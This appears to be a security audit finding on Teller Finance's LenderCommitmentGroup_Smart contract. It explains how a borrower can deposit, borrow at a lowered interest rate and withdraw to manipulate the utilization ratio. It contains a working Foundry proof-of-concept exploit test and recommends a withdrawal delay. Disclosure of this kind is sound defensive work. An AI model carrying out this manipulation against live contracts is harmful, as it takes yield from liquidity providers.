---
id: 25676
severity: "Crit/High"
---

# Interest rate in LenderCommitmentGroup_Smart may be easily manipulated by depositing, taking a loan and withdrawing

## Description



## Proof of Concept

## Vulnerability Detail

The utilization ratio is the ratio between ongoing loans and principal deposited (plus interest and/minus liquidation premiums). As the values used for its calculations are the most recent ones and there is no constraint on depositing, borrowing or withdrawing in different periods, it is easy for borrowers to pick much better interest rates. The attack can be carried out as follows:

1. Deposit principal by calling `LenderCommitmentGroup_Smart::addPrincipalToCommitmentGroup()`.
2. Take the loan out with the reduced interest rate.
3. Withdraw the shares corresponding to the borrowed principal. This attack was simulated in the following POC, which should be inserted in the test file in issue 'Drained lender due to LenderCommitmentGroup_Smart::acceptFundsForAcceptBid() _collateralAmount by STANDARD_EXPANSION_FACTOR multiplication':

```solidity
function test_POC_bypassInterestRate() public {
    uint256 principalAmount = 1000e18;
    deal(address(DAI), user, principalAmount);
    vm.startPrank(user);

    // add principal to lender to get shares
    DAI.approve(address(lender), principalAmount);
    uint256 shares = lender.addPrincipalToCommitmentGroup(principalAmount, user);

    // approve the forwarder
    tellerV2.approveMarketForwarder(marketId, address(smartCommitmentForwarder));

    // borrow the principal
    uint256 collateralAmount = 1e18;
    uint256 loanAmount = principalAmount / 2;
    deal(address(WETH), user, collateralAmount);
    WETH.approve(address(collateralManager), collateralAmount);
    uint256 bidId = smartCommitmentForwarder.acceptCommitmentWithRecipient(
        address(lender),
        loanAmount,
        collateralAmount,
        0,
        address(WETH),
        user,
        0,
        2 days
    );
    vm.stopPrank();

    principalAmount = 500e18;
    deal(address(DAI), attacker, principalAmount);

    // attacker deposits principal, takes a loan and withdraws principal
    // getting a much better interest rate

    vm.startPrank(attacker);

    // add principal to lender to get shares
    // if the line below is commented, interest rate would be 400 instead of 266
    DAI.approve(address(lender), principalAmount);
    shares = lender.addPrincipalToCommitmentGroup(principalAmount, attacker);

    // approve the forwarder
    tellerV2.approveMarketForwarder(marketId, address(smartCommitmentForwarder));

    assertEq(lender.getMinInterestRate(), 266);

    // borrow the principal
    collateralAmount = 1e18;
    loanAmount = principalAmount;
    deal(address(WETH), attacker, collateralAmount);
    WETH.approve(address(collateralManager), collateralAmount);
    bidId = smartCommitmentForwarder.acceptCommitmentWithRecipient(
        address(lender),
        loanAmount,
        collateralAmount,
        0,
        address(WETH),
        attacker,
        lender.getMinInterestRate(),
        2 days
    );

    // attacker withdraws the DAI deposit
    // poolSharesToken are burned incorrectly before calculating exchange rate
    // so this must be fixed or exchange rate will be 1
    vm.mockCall(
        address(lender.poolSharesToken()),
        abi.encodeWithSignature("burn(address,uint256)", attacker, shares),
        ""
    );
    lender.burnSharesToWithdrawEarnings(shares, attacker);

    // all principal was withdrawn for loans but attacker got a decent interest rate
    assertEq(lender.getPrincipalAmountAvailableToBorrow(), 0);

    vm.stopPrank();
}
```

## Impact

Less yield for LPs due to the borrower getting much better interest rates for free.

## Code Snippet

[LenderCommitmentGroup_Smart::getPoolUtilizationRatio()](<https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol#L757>)

```solidity
function getPoolUtilizationRatio() public view returns (uint16) {

    if (getPoolTotalEstimatedValue() == 0) {
        return 0;
    }

    return uint16(  Math.min(
        getTotalPrincipalTokensOutstandingInActiveLoans()  * 10000  /
        getPoolTotalEstimatedValue() , 10000  ));
}
```

## Recommendation

LPs could require a small delay to burn their shares to prevent abuses such as this one.
